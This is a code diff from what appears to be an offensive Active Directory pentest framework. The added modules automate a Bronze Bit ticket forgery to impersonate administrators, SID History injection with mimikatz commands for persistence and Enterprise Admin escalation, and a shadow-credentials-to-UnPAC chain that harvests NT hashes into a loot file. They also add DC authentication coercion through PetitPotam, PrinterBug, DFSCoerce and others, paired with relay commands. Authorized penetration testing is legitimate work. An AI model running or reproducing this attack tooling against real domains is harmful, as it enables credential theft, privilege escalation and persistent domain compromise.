+                log(f'  {C0}certipy auth -pfx <yourcert.pfx> -dc-ip {target.dc} -username {victim.split("@")[0]}{RESET}','info')
+            add_result('certipy','ESC14 — altSecurityIdentities injection')
 
         elif action == 'esc15':
             desc, _ = self.ESC_INFO['ESC15']
@@ -3756,6 +4128,146 @@ class SilverTicket(Module):
         spn      = self.ask('SPN (e.g. cifs/dc01.domain.local)')
         if not svc_hash or not sid or not spn: log('Hash, SID, and SPN required','error'); return
         run_cmd([t,'-nthash',svc_hash,'-domain-sid',sid,'-domain',target.domain,'-spn',spn,user], label='Silver Ticket')
+        hr()
+
+
+# =============================================================================
+# BRONZE BIT — CVE-2020-17049: modify service ticket to bypass constrained delegation
+# =============================================================================
+class BronzeBit(Module):
+    name='bronzebit'; description='CVE-2020-17049 Bronze Bit — modify S4U2Proxy ticket forwardable flag to bypass constrained delegation'; category='exploitation'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}Bronze Bit — CVE-2020-17049{RESET}','info')
+        log(f'{GREY}Bypass constrained delegation by setting the forwardable flag on a service ticket{RESET}','info')
+        log(f'{GREY}Requirements: creds for a service account with constrained delegation configured{RESET}','info')
+        print()
+
+        # check for accounts with constrained delegation
+        nxc = check_tool('netexec','nxc')
+        if nxc:
+            log('Checking for constrained delegation accounts...','info')
+            auth = ['-u',target.user]
+            if target.password: auth += ['-p',target.password]
+            elif target.hash:   auth += ['-H',target.hash]
+            run_cmd_capture([nxc,'ldap',target.dc]+auth+[
+                '--query','(&(msDS-AllowedToDelegateTo=*)(!(userAccountControl:1.2.840.113549.1.1.1:=16777216)))',
+                'sAMAccountName msDS-AllowedToDelegateTo userAccountControl'],
+                label='find constrained delegation accounts')
+
+        service_user = self.ask('service account with constrained delegation','')
+        service_hash = self.ask('service account NT hash','')
+        target_user  = self.ask('target user to impersonate (e.g. administrator)','administrator')
+        target_spn   = self.ask('target SPN (e.g. cifs/dc01.domain.local)','')
+        if not service_user or not service_hash or not target_spn:
+            log('Service account, hash, and target SPN all required','error'); hr(); return
+
+        # Bronze Bit via impacket getST with -force-forwardable
+        getST = check_tool('impacket-getST','getST.py')
+        if not getST:
+            log('impacket-getST not found — install impacket','error'); hr(); return
+
+        out = os.path.join(target.loot_dir,f'bronzebit_{target_user}.ccache')
+        log(f'{C0}Requesting forwardable service ticket (Bronze Bit)...{RESET}','info')
+        cmd = [getST,
+               '-spn',    target_spn,
+               '-impersonate', target_user,
+               '-hashes', f':{service_hash}',
+               '-force-forwardable',
+               f'{target.domain}/{service_user}']
+        run_cmd(cmd, label='getST Bronze Bit')
+
+        if os.path.exists(f'{target_user}.ccache'):
+            import shutil as _sh
+            _sh.move(f'{target_user}.ccache', out)
+        if os.path.exists(out):
+            os.environ['KRB5CCNAME'] = out
+            _set_ccache(out)
+            log(f'{GREEN}Ticket saved → {WHITE}{out}{RESET}','success')
+            log(f'  {C0}export KRB5CCNAME={out}{RESET}','info')
+            log(f'  {C0}impacket-psexec -k -no-pass {target.domain}/{target_user}@{target.dc_fqdn or target.dc}{RESET}','info')
+            add_result('bronzebit', f'forwardable ticket: {target_user} via {service_user}')
+        hr()
+
+
+# =============================================================================
+# SID HISTORY — inject SID history for persistence or cross-domain privilege
+# =============================================================================
+class SIDHistory(Module):
+    name='sidhistory'; description='SID History injection — add privileged SID to account for persistence or cross-domain privilege escalation'; category='exploitation'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}SID History Injection{RESET}','info')
+        log(f'{GREY}Add a privileged SID to an account\'s sIDHistory — persists even after password changes{RESET}','info')
+        log(f'{ORANGE}Requires: DA privileges (DCSync access){RESET}','warn')
+        print()
+
+        action = self.ask('action','inject',['inject','enum','cross-domain'])
+
+        if action == 'enum':
+            # find accounts with sIDHistory set
+            nxc = check_tool('netexec','nxc')
+            if nxc:
+                auth = ['-u',target.user]
+                if target.password: auth += ['-p',target.password]
+                elif target.hash:   auth += ['-H',target.hash]
+                log('Searching for accounts with sIDHistory...','info')
+                run_cmd_capture([nxc,'ldap',target.dc]+auth+[
+                    '--query','(sIDHistory=*)','sAMAccountName sIDHistory'],
+                    label='enum sIDHistory')
+            # also via bloodyad
+            bloody = check_tool('bloodyad','bloodyAD')
+            if bloody:
+                ba = target.bloodyad_args()
+                run_cmd([bloody]+ba+['get','object','*','--attr','sIDHistory'],
+                        label='bloodyAD sIDHistory enum')
+
+        elif action == 'inject':
+            victim    = self.ask('account to inject into (e.g. your low-priv user)','')
+            sid       = self.ask('SID to inject (e.g. DA SID S-1-5-21-...-512)','')
+            method    = self.ask('method','mimikatz',['mimikatz','dsinternals'])
+
+            if not victim or not sid:
+                log('Both account and SID required','error'); hr(); return
+
+            if method == 'mimikatz':
+                log(f'{ORANGE}Run in SYSTEM/DA shell on DC:{RESET}','warn')
+                print(f'  {C0}privilege::debug{RESET}')
+                print(f'  {C0}sid::patch{RESET}')
+                print(f'  {C0}sid::add /sam:{victim} /new:{sid}{RESET}')
+                log('Or use the generated command in your exec shell','info')
+
+            elif method == 'dsinternals':
+                log(f'{ORANGE}Requires DA PowerShell on DC:{RESET}','warn')
+                print(f'  {C0}Import-Module DSInternals{RESET}')
+                print(f'  {C0}$cred = Get-Credential{RESET}')
+                print(f'  {C0}Add-ADDBSidHistory -SamAccountName {victim} -SidHistory {sid} -DatabasePath "C:\\Windows\\NTDS\\ntds.dit"{RESET}')
+
+            log(f'{GREEN}After injection, {victim} will have {sid} privileges in their token{RESET}','success')
+            log(f'Verify with: {C0}whoami /all{RESET} after new logon','info')
+            add_result('sidhistory', f'injected {sid} → {victim}')
+
+        elif action == 'cross-domain':
+            log(f'{C0}Cross-domain SID History escalation{RESET}','info')
+            log(f'{GREY}Inject Enterprise Admins SID from a trusted domain into a user in the trusting domain{RESET}','info')
+            log(f'{GREY}Requirements: DA in source domain, need to know EA SID of target forest{RESET}','info')
+            print()
+            source_domain = target.domain
+            target_domain = self.ask('target (trusting) domain','')
+            ea_sid        = self.ask('Enterprise Admins SID of target domain (S-1-5-21-...-519)','')
+            inject_user   = self.ask('user in source domain to inject into','')
+            if not all([target_domain, ea_sid, inject_user]):
+                log('All fields required for cross-domain SID injection','error'); hr(); return
+
+            log(f'{ORANGE}Steps:{RESET}','info')
+            print(f'  {GREY}1. Run mimikatz on source DC:{RESET}')
+            print(f'     {C0}privilege::debug; sid::patch{RESET}')
+            print(f'     {C0}sid::add /sam:{inject_user} /new:{ea_sid}{RESET}')
+            print(f'  {GREY}2. Request TGT in source domain with {inject_user}{RESET}')
+            print(f'  {GREY}3. Access resources in {target_domain} — EA privileges active{RESET}')
+            add_result('sidhistory', f'cross-domain: {ea_sid} → {inject_user}')
         hr()
 
 
@@ -4277,6 +4789,8 @@ class Rubeus(Module):
 _PATHPWN_HINTS: dict = {}
 
 ACE_TO_MODULE = {
+    # ── Group compromise ─────────────────────────────────────────────────────
+    'CanCompromiseMember':     ('bloody',       'addtogroup',  'control group → compromise member account'),
     # ── Ownership / DACL ─────────────────────────────────────────────────────
     'GenericAll':              ('bloody',       'resetpwd',    'full control — reset pwd, add to group, shadow creds'),
     'GenericWrite':            ('shadowcred',   'auto',        'shadow credentials or SPN add -> kerberoast'),
@@ -4435,7 +4949,13 @@ def _build_graph(data):
 
     for g in data['groups']:
         for m in g.get('Members', []):
-            adj[m['ObjectIdentifier']].append(('MemberOf', g['ObjectIdentifier']))
+            msid = m.get('ObjectIdentifier','')
+            if msid:
+                # standard MemberOf: member → group
+                adj[msid].append(('MemberOf', g['ObjectIdentifier']))
+                # if you GenericAll/WriteOwner a group you can impersonate members
+                # add reverse edge: group → member (for pathfinding through group control)
+                adj[g['ObjectIdentifier']].append(('CanCompromiseMember', msid))
 
     def _results(obj, key):
         """Get results list from field that could be dict{'Results':[]} or plain list"""
@@ -4661,6 +5181,8 @@ def _edge_weight(right, src_type, dst_type):
     # Group membership — free, just inherit rights
     if right == 'MemberOf':
         return 1
+    if right == 'CanCompromiseMember':
+        return 3  # control group → act as member
     # Strong rights on groups
     if right in ('AddMember','AddSelf') and dst_type in ('Group','group'):
         return 2
@@ -4691,7 +5213,7 @@ def _edge_weight(right, src_type, dst_type):
 def _dijkstra_paths(starts, adj, hv, sn, st, max_depth=10):
     """Dijkstra shortest path weighted by exploitation difficulty.
     Returns list of paths sorted by total weight (best first)."""
-    import heapq as _hq
+    import heapq
 
     _COMPROMISE = {'GenericAll','AllExtendedRights','ForceChangePassword','Owns',
                    'WriteDacl','WriteOwner','AddKeyCredentialLink','GenericWrite',
@@ -4699,20 +5221,12 @@ def _dijkstra_paths(starts, adj, hv, sn, st, max_depth=10):
                    'ManageCertificates','SQLAdmin','AddMember','AddSelf',
                    'WriteAccountRestrictions','GetChangesAll'}
 
-    # heap: (cost, path_as_list_of_(node,right,prev))
-    heap = []
-    for s in starts:
-        heapq.heappush(heap, (0, id([]), [(s, None, None)]))
-
-    visited = {}  # node → best cost seen
-    found   = []
-
-    import heapq
     heap = []
     for s in starts:
         heapq.heappush(heap, (0, [(s, None, None)]))
 
     visited = {}
+    found   = []
 
     while heap:
         cost, path = heapq.heappop(heap)
@@ -4805,7 +5319,7 @@ class Pathfind(Module):
     name='pathfind'; description='parse BloodHound data — find shortest attack path to DA'; category='recon'
     def run(self, target):
         hr()
-        log('Loading BloodHound data from loot/bloodhound/...', 'info')
+        log(f'Loading BloodHound data from {WHITE}{target.loot_dir}/bloodhound/{RESET}...', 'info')
         data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
         if not data['users']:
             log(f'No BloodHound JSON found — run {C0}adrecon{RESET} first', 'error'); hr(); return
@@ -4820,7 +5334,7 @@ class Pathfind(Module):
             return (name == q or name.split('@')[0] == q or
                     sam == q or sam.split('@')[0] == q or
                     q in name)
-        owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
+        owned_sid = next((u['ObjectIdentifier'] for u in data['users']+data['groups']+data['computers'] if _match_user(u, owned)), None)
         if not owned_sid:
             # show clean user names only (skip SID-style, health mailboxes, built-ins)
             skip = {'GUEST','KRBTGT','DEFAULTACCOUNT','ADMINISTRATOR'}
@@ -4828,7 +5342,7 @@ class Pathfind(Module):
                 u['Properties'].get('samaccountname',
                 u['Properties'].get('SamAccountName',
                 u['Properties'].get('name',''))).split('@')[0]
-                for u in data['users']
+                for u in data['users']+data['groups']
                 if not u['Properties'].get('name','').startswith('$')
                 and u['Properties'].get('samaccountname',
                     u['Properties'].get('name','')).upper().split('@')[0] not in skip
@@ -4838,7 +5352,7 @@ class Pathfind(Module):
             print('  ' + '  '.join(names))
             owned = self.ask('owned user', names[0] if names else '')
             if not owned: hr(); return
-            owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
+            owned_sid = next((u['ObjectIdentifier'] for u in data['users']+data['groups']+data['computers'] if _match_user(u, owned)), None)
             if not owned_sid:
                 log(f'Still not found','error'); hr(); return
         log(f'Pathfinding from {WHITE}{owned}{RESET}...', 'info')
@@ -5013,7 +5527,7 @@ class PathPwn(Module):
             sam  = u['Properties'].get('samaccountname', u['Properties'].get('SamAccountName','')).upper()
             return (name == q or name.split('@')[0] == q or sam == q or sam.split('@')[0] == q)
 
-        owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
+        owned_sid = next((u['ObjectIdentifier'] for u in data['users']+data['groups']+data['computers'] if _match_user(u, owned)), None)
         if not owned_sid:
             log(f'User {WHITE}{owned}{RESET} not found in BloodHound data','error'); hr(); return
 
@@ -7975,58 +8489,124 @@ class PKINIT(Module):
 # UNPAC — extract NT hash from PKINIT TGT (unpac-the-hash)
 # =============================================================================
 class UnPAC(Module):
-    name='unpac'; description='getnthash -- extract NT hash from PKINIT TGT (unpac-the-hash, no NTLM needed)'; category='credentials'
+    name='unpac'; description='UnPAC-the-hash — extract NT hash from PKINIT TGT; chains with shadowcred for no-NTLM credential recovery'; category='credentials'
     def run(self, target):
         if not self.req(target): return
         hr()
-        log(f'{C0}UnPAC-the-hash{RESET} — extract NT hash from Kerberos PKINIT TGT','info')
-        log(f'Requires a TGT obtained via PKINIT (certificate auth)','info')
+        log(f'{C0}UnPAC-the-hash{RESET} — extract NT hash via PKINIT, no NTLM needed','info')
+        log(f'{GREY}Works after: certipy auth, pkinit, or shadow credentials{RESET}','info')
+        print()
+
+        mode = self.ask('mode','auto',['auto','shadow-then-unpac','manual'])
+
+        if mode == 'shadow-then-unpac':
+            log(f'{C0}Shadow Credentials → UnPAC chain{RESET}','info')
+            log(f'{GREY}Requires: AddKeyCredentialLink on target{RESET}','info')
+
+            victim = self.ask('target account','')
+            if not victim: hr(); return
+
+            # Step 1: shadow creds via certipy or pywhisker
+            log(f'\n{C0}Step 1: inject shadow credentials on {victim}{RESET}','info')
+            certipy = check_tool('certipy','certipy-ad')
+            pywhisk = check_tool('pywhisker','pywhisker.py')
+
+            ba = target.bloodyad_args() if hasattr(target,'bloodyad_args') else []
+
+            if certipy:
+                shadow_out = os.path.join(target.loot_dir, f'{victim.split("@")[0]}_shadow')
+                run_cmd([certipy,'shadow','auto']+[
+                    '-u',f'{target.user}@{target.domain}',
+                    '-p',target.password or '',
+                    '-dc-ip',target.dc,
+                    '-account',victim.split('@')[0]],
+                    label='certipy shadow auto')
+                # certipy shadow auto does everything — find the pfx
+                pfx_files = sorted(glob.glob(os.path.join(os.getcwd(),'*.pfx')),
+                                   key=os.path.getmtime, reverse=True)
+                if pfx_files:
+                    pfx = pfx_files[0]
+                    log(f'{GREEN}Shadow cert: {WHITE}{pfx}{RESET}','success')
+                    # certipy auth with -no-hash to get ccache + AS-REP key
+                    log(f'\n{C0}Step 2: authenticate via PKINIT to get TGT{RESET}','info')
+                    run_cmd([certipy,'auth','-pfx',pfx,'-dc-ip',target.dc,
+                             '-username',victim.split('@')[0],'-domain',target.domain],
+                            label='certipy auth (shadow)')
+                    # now run getnthash
+                    log(f'\n{C0}Step 3: UnPAC — extract NT hash from PKINIT TGT{RESET}','info')
+                    self._run_getnthash(target, victim.split('@')[0])
+                hr(); return
+
+        elif mode == 'auto':
+            # auto-detect ccache and AS-REP key from loot dir
+            log('Auto mode — searching for PKINIT artifacts in loot dir...','info')
+            ccaches = sorted(glob.glob(os.path.join(target.loot_dir,'*.ccache')),
+                            key=os.path.getmtime, reverse=True)
+            if ccaches:
+                best = ccaches[0]
+                user = os.path.basename(best).replace('.ccache','')
+                log(f'Found ccache: {WHITE}{best}{RESET}','info')
+                os.environ['KRB5CCNAME'] = best
+                self._run_getnthash(target, user)
+            else:
+                log('No ccache found in loot dir — run pkinit or certipy auth first','warn')
+                log(f'Or use mode: {C0}shadow-then-unpac{RESET} for full auto chain','info')
+
+        else:  # manual
+            t_user = self.ask('target user', target.user or '')
+            ccache = os.environ.get('KRB5CCNAME','')
+            loot_cc = os.path.join(target.loot_dir, f'{t_user}.ccache')
+            if not ccache and os.path.exists(loot_cc):
+                ccache = loot_cc
+                os.environ['KRB5CCNAME'] = ccache
+            if not ccache or not os.path.exists(ccache):
+                log('No TGT/ccache found — run pkinit or certipy auth first','error')
+                hr(); return
+            self._run_getnthash(target, t_user)
         hr()
 
-        # find getnthash
+    def _run_getnthash(self, target, t_user):
+        """Run getnthash to extract NT hash from PKINIT TGT."""
         gnh = None
         for p in [os.path.expanduser('~/.segfault-ad/tools/PKINITtools/getnthash.py'),
-                  os.path.expanduser('~/.segfault-ad/tools/PKINITtools/getnthash.py'),
                   '/opt/PKINITtools/getnthash.py']:
             if os.path.exists(p): gnh = p; break
         if not gnh:
-            log('getnthash.py not found — part of PKINITtools','error')
-            hr(); return
+            log(f'getnthash.py not found — install PKINITtools: {C0}git clone https://github.com/dirkjanm/PKINITtools{RESET}','error')
+            return
 
-        t_user = self.ask('target user', target.user or '')
-        ccache = os.environ.get('KRB5CCNAME','')
-        loot_cc = os.path.join(target.loot_dir, f'{t_user}.ccache')
-        if not ccache and os.path.exists(loot_cc):
-            ccache = loot_cc; os.environ['KRB5CCNAME'] = ccache
+        key = self.ask('AS-REP encryption key (from certipy/gettgtpkinit output — leave blank to try without)','')
 
-        if not ccache or not os.path.exists(ccache):
-            log('No TGT/ccache found — run pkinit first','error'); hr(); return
-
-        # get AS-REP key from the TGT (stored during gettgtpkinit)
-        key = self.ask('AS-REP key (from gettgtpkinit output)','')
-
-        cmd = ['python3', gnh,
-               '-key', key,
-               f'{target.domain}/{t_user}',
-               '-dc-ip', target.dc]
+        cmd = ['python3', gnh, f'{target.domain}/{t_user}', '-dc-ip', target.dc]
+        if key: cmd += ['-key', key]
 
         rc, lines = run_cmd_capture(cmd, label='getnthash')
-        for l in lines:
-            if 'Recovered NT Hash' in l or 'NT Hash' in l:
-                log(l.strip(),'success')
-            elif l.strip():
-                print(f'  {GREY}{l.strip()}{RESET}')
 
-        # parse NT hash from output
         nt_hash = None
         for l in lines:
+            if 'Recovered NT Hash' in l or 'NT Hash' in l or 'nt hash' in l.lower():
+                log(l.strip(),'success')
             m = re.search(r'([0-9a-f]{32})', l, re.I)
-            if m: nt_hash = m.group(1); break
+            if m and not nt_hash: nt_hash = m.group(1)
+
         if nt_hash:
-            log(f'{GREEN}NT hash: {WHITE}{nt_hash}{RESET}','success')
-            with open(os.path.join(target.loot_dir,'cracked.txt'),'a') as _f:
-                _f.write(f'{t_user}:{nt_hash}\n')
-        hr()
+            log(f'{GREEN}NT hash recovered: {WHITE}{nt_hash}{RESET}','success')
+            # save to cracked.txt and DB
+            with open(os.path.join(target.loot_dir,'cracked.txt'),'a') as f:
+                f.write(f'{t_user}:{nt_hash}\n')
+            _db_save_cred(os.path.basename(os.path.dirname(target.loot_dir)),
+                          target.domain, t_user, None, hash_val=nt_hash, source='unpac')
+            add_result('unpac', f'{t_user}:{nt_hash[:8]}...')
+            log(f'Use with: {C0}→ set user={t_user} hash={nt_hash}{RESET}','info')
+            log(f'Then: {C0}→ exec{RESET} or {C0}→ dcsync{RESET}','info')
+            # auto-set target hash
+            if target.user == t_user or not target.hash:
+                target.hash     = nt_hash
+                target.password = None
+                log(f'{GREEN}Target hash auto-updated{RESET}','success')
+        else:
+            log('No NT hash recovered — check AS-REP key is correct','warn')
+            log(f'Try: {C0}certipy auth -pfx <cert.pfx> -dc-ip {target.dc}{RESET} to get the key','info')
 
 # =============================================================================
 # LDAPSHELL — certipy ldap-shell via Schannel (NTLM-disabled environments)
@@ -8949,54 +9529,79 @@ class ZipSlip(Module):
 
 
 class Coercion(Module):
-    name='coercion'; description='PetitPotam / PrinterBug / DFSCoerce / Coercer — force DC to auth to listener'; category='exploitation'
+    name='coercion'; description='PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce / Coercer — force DC to auth to listener'; category='exploitation'
     def run(self, target):
         if not self.req(target): return
         hr()
-        method = self.ask('method','petitpotam',['petitpotam','printerbug','dfscoerce','coercer'])
-        listener = self.ask('listener IP (your machine)', '')
+        method = self.ask('method','petitpotam',
+            ['petitpotam','printerbug','dfscoerce','shadowcoerce','mseven6','coercer','all'])
+        listener = self.ask('listener IP', _get_tun0() or _hivemind_redirector() or '')
         if not listener: log('Listener IP required','error'); return
         dc_host = target.dc_fqdn or target.dc
 
         log(f'{ORANGE}Start responder/ntlmrelayx on {WHITE}{listener}{ORANGE} before running{RESET}','warn')
-        log(f'  {WHITE}responder -I eth0 -v{RESET}','info')
+        log(f'  {WHITE}responder -I tun0 -v{RESET}','info')
         log(f'  {WHITE}impacket-ntlmrelayx -t ldaps://{target.dc} --delegate-access{RESET}','info')
         hr()
 
-        if method == 'petitpotam':
-            t = check_tool('PetitPotam.py','petitpotam','petitpotam.py')
-            if not t: log(f'Install: {WHITE}git clone https://github.com/topotam/PetitPotam{RESET}','warn'); return
-            auth = []
-            if target.user and (target.password or target.hash):
-                if target.password: auth = ['-d',target.domain,'-u',target.user,'-p',target.password]
-                else: auth = ['-d',target.domain,'-u',target.user,'-hashes',f':{target.hash}']
-            cmd = [t] + auth + [listener, dc_host]
-            run_cmd(cmd, label='PetitPotam')
+        def _auth_args():
+            a = ['-d',target.domain,'-u',target.user]
+            if target.password: a += ['-p',target.password]
+            elif target.hash:   a += ['-hashes',f':{target.hash}']
+            return a
 
-        elif method == 'printerbug':
-            t = check_tool('printerbug.py','SpoolSample')
-            if not t: log(f'Install: {WHITE}git clone https://github.com/dirkjanm/krbrelayx{RESET} (printerbug.py)','warn'); return
+        def _run_petitpotam():
+            t = check_tool('PetitPotam.py','petitpotam.py')
+            if not t: log(f'git clone https://github.com/topotam/PetitPotam','warn'); return
+            run_cmd([t]+(_auth_args() if target.user else [])+[listener,dc_host],label='PetitPotam')
+
+        def _run_printerbug():
+            t = check_tool('printerbug.py')
+            if not t: log(f'git clone https://github.com/dirkjanm/krbrelayx','warn'); return
             auth_str = f'{target.domain}/{target.user}'
             if target.password: auth_str += f':{target.password}'
-            cmd = [t, auth_str, listener]
-            run_cmd(cmd, label='PrinterBug')
+            run_cmd([t,auth_str,listener], label='PrinterBug')
 
-        elif method == 'dfscoerce':
+        def _run_dfscoerce():
             t = check_tool('dfscoerce.py')
-            if not t: log(f'Install: {WHITE}git clone https://github.com/mr-t-sec/DFSCoerce{RESET}','warn'); return
-            cmd = [t, '-u', target.user, '-p', target.password or '', '-d', target.domain, listener, dc_host]
-            run_cmd(cmd, label='DFSCoerce')
+            if not t: log(f'git clone https://github.com/mr-t-sec/DFSCoerce','warn'); return
+            run_cmd([t]+_auth_args()+[listener,dc_host], label='DFSCoerce')
 
-        elif method == 'coercer':
+        def _run_shadowcoerce():
+            t = check_tool('shadowcoerce.py')
+            if not t: log(f'git clone https://github.com/ShutdownRepo/ShadowCoerce','warn'); return
+            run_cmd(['python3',t]+_auth_args()+[listener,dc_host], label='ShadowCoerce')
+
+        def _run_mseven6():
+            t = check_tool('MSEven6.py','mseven6')
+            if not t: log(f'git clone https://github.com/ly4k/MSEven6','warn'); return
+            run_cmd(['python3',t]+_auth_args()+['-listener',listener,'-target',dc_host], label='MSEven6')
+
+        def _run_coercer():
             t = check_tool('coercer','Coercer')
-            if not t: log(f'Install: {WHITE}pip install coercer{RESET}','warn'); return
-            cmd = [t, 'coerce', '-l', listener, '-t', dc_host,
-                   '-u', f'{target.domain}/{target.user}']
-            if target.password: cmd += ['-p', target.password]
-            elif target.hash: cmd += ['-H', target.hash]
+            if not t: log(f'pip install coercer','warn'); return
+            cmd = [t,'coerce','-l',listener,'-t',dc_host,'-u',f'{target.domain}/{target.user}']
+            if target.password: cmd += ['-p',target.password]
+            elif target.hash:   cmd += ['-H',target.hash]
             run_cmd(cmd, label='Coercer')
-        hr()
 
+        runners = {
+            'petitpotam':  _run_petitpotam,
+            'printerbug':  _run_printerbug,
+            'dfscoerce':   _run_dfscoerce,
+            'shadowcoerce':_run_shadowcoerce,
+            'mseven6':     _run_mseven6,
+            'coercer':     _run_coercer,
+        }
+        if method == 'all':
+            log(f'{C0}Running all coercion methods against {WHITE}{dc_host}{RESET}','info')
+            for mname, fn in runners.items():
+                log(f'{GREY}→ {mname}{RESET}','info')
+                try: fn()
+                except Exception as e: log(f'{e}','warn')
+        elif method in runners:
+            runners[method]()
+        hr()
 class Ligolo(Module):
     name='ligolo'; description='ligolo-ng — reverse tunnel pivot, add routes, agent management'; category='lateral'
     def run(self, target):
@@ -10873,7 +11478,7 @@ MODULES = {m.name: m for m in [
     Ligolo, BloodHoundQuery, AutoEnum, RunasCs, KeePass, FTP,
     DPloot, SCCM, Pre2K, ADIDNS,
     SyncJacking, DNSAdmins, AzureADSync, LAPSToolkit, PywerView, HealthCheck,
-    ACLScan, Trusts, Grouper2, ACLight, Lsassy, ADCSKiller, Snaffler, PyWSUS,
+    ACLScan, Trusts, Grouper2, ACLight, Lsassy, ADCSKiller, Snaffler, PyWSUS, BronzeBit, SIDHistory,
     Cleanup,
 ]}
 
@@ -10884,7 +11489,7 @@ GROUPS = {
     'recon':        ['enum','ldapenum','bloodyenum','kerbrute','enum4linux','rpcenum','gpp','adrecon','dnsdump','adidns','pathfind','shares','mssql','unauth','bh-query','autoenum','ftp','healthcheck','pywerview','nmap','ffuf','nxcmodules','sccm','trusts','aclscan','grouper2','aclight','snaffler','powerview'],
     'credentials':  ['lsassy','kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','timeroast','keepass','sccm','pre2k','azureadsync'],
     'lateral':      ['secretsdump','dcsync','pth','ptt','exec','bloody','smbclient','smbclientng','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
-    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','backupabuse','sliver','pathpwn','adcskiller','pywsus','pywhisker','crossdomain','zipslip',
+    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','backupabuse','sliver','pathpwn','adcskiller','pywsus','bronzebit','sidhistory','pywhisker','crossdomain','zipslip',
                      'golden','silver','diamond','sapphire','rbcd','shadowcred','trusts','printnightmare','rubeus',
                      'syncjacking','dnsadmins'],
     'persistence':  ['aclpersist','dcshadow'],
@@ -11888,7 +12493,7 @@ tr:hover td{{background:#161b22}}
 <div class="topbar">
   <div>
     <h1>Active Directory Pentest Report</h1>
-    <div class="brand">segfault.solutions · segfault-ad v{{VERSION}} · {e(now_str)}</div>
+    <div class="brand">segfault.solutions · segfault-ad v{VERSION} · {e(now_str)}</div>
     <div class="sev" style="color:{sev_color};border-color:{sev_color}40">{e(severity)}</div>
   </div>
   <div style="text-align:right">
@@ -12688,7 +13293,6 @@ PIP_PKGS = [
     ('abuseACL',      'abuseACL'),
     ('lsassy',        'lsassy'),
     ('autobloody',    'autobloody'),
-    ('pywsus',        'pywsus'),
     ('smbclientng',   'smbclientng'),
     ('powerview',     'powerview'),
 ]
@@ -12733,7 +13337,8 @@ GIT_REPOS = [
     ('pxethiefy',        'https://github.com/sse-secure-systems/Active-Directory-Spotlights', None, 'pxethiefy.py'),
     ('SystemDPAPIdump',  'https://github.com/fortra/impacket',                  None, 'SystemDPAPIdump.py'),
     ('abuseACL',         'https://github.com/AetherBlack/abuseACL',             'pip install . --break-system-packages 2>/dev/null; true', 'abuseACL'),
-    ('ADCSKiller',       'https://github.com/grimsec/ADCSKiller',               'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'ADCSKiller.py'),
+    ('pywsus',           'https://github.com/GoSecure/pywsus',                  'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'pywsus.py'),
+    ('ADCSKiller',       'https://github.com/cube0x0/ADCSKiller',               'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'ADCSKiller.py'),
     ('Grouper2',         'https://github.com/l0ss/Grouper2',                    None, 'Grouper2.exe'),
     ('ACLight',          'https://github.com/cyberark/ACLight',                  None, 'ACLight2.ps1'),
 ]
@@ -12756,7 +13361,7 @@ WIN_BINS = [
     ('SharpUp.exe',          'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe',                                  'exe'),
     ('Seatbelt.exe',         'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe',                                 'exe'),
     ('Snaffler.exe',         'https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe',                                           'exe'),
-    ('SharpHound.exe',       'https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound.exe',                                       'exe'),
+    ('SharpHound.exe',       'https://github.com/SpecterOps/SharpHound/releases/download/v2.6.0/SharpHound.exe',                                         'exe'),
     ('GodPotato-NET4.exe',   'https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe',                               'exe'),
     # PowerShell scripts
     ('PowerView.ps1',        'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1',                                      'exe'),
@@ -13120,7 +13725,7 @@ CMDS = sorted(list(MODULES.keys()) + ['check','tools',
     'flag','flags','tgt','hint','h','explain','ex','autopwn','ap','b64get','healthcheck','db',
     'clockskew','install','clear','exit','quit','q','help','?',
     'history','search',
-    'hivemind','hivemind upload','sccm','trusts','aclscan','adcskiller','grouper2','aclight','lsassy','bh-view','snaffler','pywsus','export','import','targets','smbclientng','powerview',
+    'hivemind','hivemind upload','sccm','trusts','aclscan','adcskiller','grouper2','aclight','lsassy','bh-view','snaffler','pywsus','export','import','targets','smbclientng','powerview','bronzebit','sidhistory',
 ])
 
 def _get_workspaces():
@@ -13240,6 +13845,8 @@ def load_workspace(name, target):
         os.makedirs(ws_loot, exist_ok=True)
         target.loot_dir = ws_loot
         target.workspace_set = True
+        invalidate_bh_cache()  # clear stale BH data from previous workspace
+        _MODULE_RUN_CACHE.clear()  # clear module run cache too
         if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
         _auto_load_ccache(target)
         _write_krb5(target)
@@ -14775,6 +15382,7 @@ def repl():
             _bh_view(TARGET)
         elif cmd == 'db':
             hr()
+            _DIM = GREY
             sub = args[0] if args else 'help'
             ws  = os.path.basename(TARGET.loot_dir) if TARGET.loot_dir else None
 
@@ -14786,7 +15394,7 @@ def repl():
                     print(f'\n  {C0}[ credentials ]{RESET}')
                     for r in results['credentials']:
                         p = r['password'] or r['hash'] or '?'
-                        print(f'  {GREEN}✓{RESET}  {WHITE}{r["username"]:<20}{RESET}  {GREY}{p[:40]}{RESET}  {DIM}{r["workspace"]}{RESET}')
+                        print(f'  {GREEN}✓{RESET}  {WHITE}{r["username"]:<20}{RESET}  {GREY}{p[:40]}{RESET}  {GREY}{r["workspace"]}{RESET}')
                 if results['hashes']:
                     print(f'\n  {C0}[ hashes ]{RESET}')
